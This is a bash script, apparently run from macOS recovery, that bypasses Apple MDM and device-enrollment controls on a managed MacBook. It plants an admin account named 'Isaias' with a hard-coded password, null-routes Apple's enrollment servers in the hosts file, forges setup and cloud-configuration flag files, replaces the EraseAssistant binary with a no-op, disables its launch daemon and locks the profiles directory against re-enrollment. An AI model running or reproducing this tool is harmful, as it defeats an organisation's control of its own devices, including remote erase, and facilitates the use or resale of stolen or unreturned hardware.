#!/bin/bash

do_bypass() {
	if [ -d "/Volumes/Macintosh HD - Data" ]; then
		diskutil rename "Macintosh HD - Data" "Data"
	fi

	dscl_path='/Volumes/Data/private/var/db/dslocal/nodes/Default'
	dscl -f "$dscl_path" localhost -create "/Local/Default/Users/Isaias"
	dscl -f "$dscl_path" localhost -create "/Local/Default/Users/Isaias" UserShell "/bin/zsh"
	dscl -f "$dscl_path" localhost -create "/Local/Default/Users/Isaias" RealName "Isaias"
	dscl -f "$dscl_path" localhost -create "/Local/Default/Users/Isaias" UniqueID "501"
	dscl -f "$dscl_path" localhost -create "/Local/Default/Users/Isaias" PrimaryGroupID "20"
	mkdir -p "/Volumes/Data/Users/Isaias"
	dscl -f "$dscl_path" localhost -create "/Local/Default/Users/Isaias" NFSHomeDirectory "/Users/Isaias"
	dscl -f "$dscl_path" localhost -passwd "/Local/Default/Users/Isaias" "marketplace2026#"
	dscl -f "$dscl_path" localhost -append "/Local/Default/Groups/admin" GroupMembership Isaias

	echo "0.0.0.0 deviceenrollment.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
	echo "0.0.0.0 mdmenrollment.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
	echo "0.0.0.0 iprofiles.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts

	touch /Volumes/Data/private/var/db/.AppleSetupDone
	rm -f "/Volumes/Macintosh HD/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord"
	rm -f "/Volumes/Macintosh HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound"
	touch "/Volumes/Macintosh HD/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled"
	touch "/Volumes/Macintosh HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound"

	# Disable Erase Assistant by replacing binary with a no-op on the system volume
	erase_assistant="/Volumes/Macintosh HD/System/Library/CoreServices/EraseAssistant.app/Contents/MacOS/EraseAssistant"
	if [ -f "$erase_assistant" ]; then
		mv "$erase_assistant" "${erase_assistant}.bak"
		echo '#!/bin/bash\nexit 0' > "$erase_assistant"
		chmod +x "$erase_assistant"
	fi

	# Disable the LaunchDaemon for EraseAssistant on the offline volume
	erase_plist="/Volumes/Macintosh HD/System/Library/LaunchDaemons/com.apple.EraseAssistant.plist"
	if [ -f "$erase_plist" ]; then
		mv "$erase_plist" "${erase_plist}.bak"
	fi

	# Block MDM re-enrollment by locking the profiles settings directory
	profiles_dir="/Volumes/Macintosh HD/var/db/ConfigurationProfiles/Settings"
	chflags schg "$profiles_dir"/.cloudConfig* 2>/dev/null
	chmod 000 "$profiles_dir" 2>/dev/null

	# Prevent Setup Assistant from relaunching MDM check
	setup_done="/Volumes/Data/private/var/db/.AppleSetupDone"
	chflags uchg "$setup_done" 2>/dev/null
}

do_bypass

echo "DONE. RESTART THE MACBOOK"